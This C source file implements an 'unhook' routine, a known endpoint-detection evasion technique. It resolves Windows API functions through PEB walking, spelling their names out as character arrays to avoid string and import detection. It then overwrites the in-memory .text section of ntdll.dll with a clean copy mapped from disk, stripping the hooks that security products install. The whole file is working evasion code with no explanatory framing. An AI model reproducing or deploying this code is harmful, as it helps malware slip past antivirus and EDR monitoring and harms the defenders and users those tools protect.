#include <stdio.h>
#include <windows.h>
#include "peb-lookup.h"

extern "C"

int unhook()
{

    typedef struct _MODULEINFO {
    LPVOID lpBaseOfDll;
    DWORD SizeOfImage;
    LPVOID EntryPoint;
    } MODULEINFO, *LPMODULEINFO;

    typedef struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
  } SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;

    wchar_t kernel32_dll_str[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
    char kernel_base_dll[] = {'k','e','r','n','e','l','b','a','s','e','.','d','l','l',0};
    char load_lib_str[] = { 'L','o','a','d','L','i','b','r','a','r','y','A', 0 };
    char get_proc_str[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s', 0 };
    char get_current_proc[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s',0};
    char get_mod_handle[] = {'G','e','t','M','o','d','u','l','e','H','a','n','d','l','e','A',0};
    char get_mod_information[] = {'G','e','t','M','o','d','u','l','e','I','n','f','o','r','m','a','t','i','o','n',0};
    char create_file[] = {'C','r','e','a','t','e','F','i','l','e','A',0};
    char create_mapping[] = {'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A',0};
    char map_view[] = {'M','a','p','V','i','e','w','O','f','F','i','l','e',0};
    char virtual_protect[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};
    char close_handle[] = {'C','l','o','s','e','H','a','n','d','l','e',0};
    char free_lib[] = {'F','r','e','e','L','i','b','r','a','r','y',0};

    char msvcrt_dll[] = {'m','s','v','c','r','t','.','d','l','l',0};
    char strcmp_str[] = {'s','t','r','c','m','p',0};
    char memcpy_str[] = {'m','e','m','c','p','y',0};
    char printf_str[] = {'p','r','i','n','t','f',0};

    LPVOID pKernel32 = get_module_by_name((const LPWSTR)kernel32_dll_str);
    LPVOID pLoadLibrary = get_func_by_name((HMODULE)pKernel32, (LPSTR)load_lib_str);
    LPVOID pGetProcAddress = get_func_by_name((HMODULE)pKernel32, (LPSTR)get_proc_str);
    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR)) pLoadLibrary;
    FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName) = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) pGetProcAddress;
    HANDLE(WINAPI * _GetCurrentProcess)() = (HANDLE(WINAPI*)()) _GetProcAddress((HMODULE)pKernel32,get_current_proc);
    HMODULE(WINAPI * _GetModuleHandleA)(LPCSTR lpModuleName) = (HMODULE(WINAPI*)(LPCSTR)) _GetProcAddress((HMODULE)pKernel32,get_mod_handle);
    LPVOID pKernelbase = _LoadLibraryA(kernel_base_dll);
    BOOL(WINAPI * _GetModuleInformation)(HANDLE hProcess,HMODULE hModule,LPMODULEINFO lpmodinfo,DWORD cb) = (BOOL(WINAPI*)(HANDLE,HMODULE,LPMODULEINFO,DWORD)) _GetProcAddress((HMODULE)pKernelbase,get_mod_information);
    HANDLE(WINAPI * _CreateFileA)(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes,HANDLE hTemplateFile) = (HANDLE(WINAPI*)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE)) _GetProcAddress((HMODULE)pKernel32,create_file);
    HANDLE(WINAPI * _CreateFileMappingA)(HANDLE hFile,LPSECURITY_ATTRIBUTES lpFileMappingAttributes,DWORD flProtect,DWORD dwMaximumSizeHigh,DWORD dwMaximumSizeLow,LPCSTR lpName) = (HANDLE(WINAPI*)(HANDLE,LPSECURITY_ATTRIBUTES,DWORD,DWORD,DWORD,LPCSTR)) _GetProcAddress((HMODULE)pKernel32,create_mapping);
    LPVOID(WINAPI * _MapViewOfFile)(HANDLE hFileMappingObject,DWORD dwDesiredAccess,DWORD dwFileOffsetHigh,DWORD dwFileOffsetLow,SIZE_T dwNumberOfBytesToMap) = (LPVOID(WINAPI*)(HANDLE,DWORD,DWORD,DWORD,SIZE_T)) _GetProcAddress((HMODULE)pKernel32,map_view);
    BOOL(WINAPI * _VirtualProtect)(LPVOID lpAddress,SIZE_T dwSize,DWORD flNewProtect,PDWORD lpflOldProtect) = (BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD,PDWORD)) _GetProcAddress((HMODULE)pKernel32,virtual_protect);
    BOOL(WINAPI* _CloseHandle)(HANDLE hObject) = (BOOL(WINAPI*)(HANDLE)) _GetProcAddress((HMODULE)pKernel32,close_handle);
    BOOL(WINAPI* _FreeLibrary)(HMODULE hLibModule) = (BOOL(WINAPI*)(HMODULE)) _GetProcAddress((HMODULE)pKernel32,free_lib);
    LPVOID pMsvcrt = _LoadLibraryA(msvcrt_dll);
    int(WINAPI * _strcmp)(const char* string1,const char* string2) = (int(WINAPI*)(const char*,const char*)) _GetProcAddress((HMODULE)pMsvcrt,strcmp_str);
    void*(WINAPI * _memcpy)(void* dest,const void* src,size_t count) = (void*(WINAPI*)(void*,const void*,size_t)) _GetProcAddress((HMODULE)pMsvcrt,memcpy_str);
    int(WINAPI * _printf)(const char* format, ...) = (int(WINAPI*)(const char*,...)) _GetProcAddress((HMODULE)pMsvcrt,printf_str);
    if (!_printf)
    {
      return 17;
    }
    HANDLE process = _GetCurrentProcess();
    char format1[] = {'o','u','t','p','u','t',':',' ','%','p','\n',0};
    _printf(format1,process);
    MODULEINFO mi = {};
    char ntdll_str[] = {'n','t','d','l','l','.','d','l','l',0};
    HMODULE ntdllModule = _GetModuleHandleA(ntdll_str);
    _printf(format1,ntdllModule);
    char file_str[] = {'c',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0};
    
    _GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
    _printf(format1,ntdllBase);
    HANDLE ntdllFile = _CreateFileA(file_str, 0x80000000, 0x00000001, NULL, 3, 0, NULL);
    _printf(format1,ntdllFile);
    
    HANDLE ntdllMapping = _CreateFileMappingA(ntdllFile, NULL, 0x02 | 0x1000000, 0, 0, NULL);
    _printf(format1,ntdllMapping);
    LPVOID ntdllMappingAddress = _MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
    _printf(format1,ntdllMappingAddress);
    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
    char text_str[] = {'.','t','e','x','t',0};

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
      PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
      
      if (!_strcmp((char*)hookedSectionHeader->Name, (char*)text_str)) {
        _printf(format1,hookedSectionHeader->Name);
        DWORD oldProtection = 0;
        bool isProtected = _VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
        _memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
        isProtected = _VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
      }
    }
    
    _CloseHandle(process);
    _CloseHandle(ntdllFile);
    _CloseHandle(ntdllMapping);
    _FreeLibrary(ntdllModule);
    
    return 0;
  }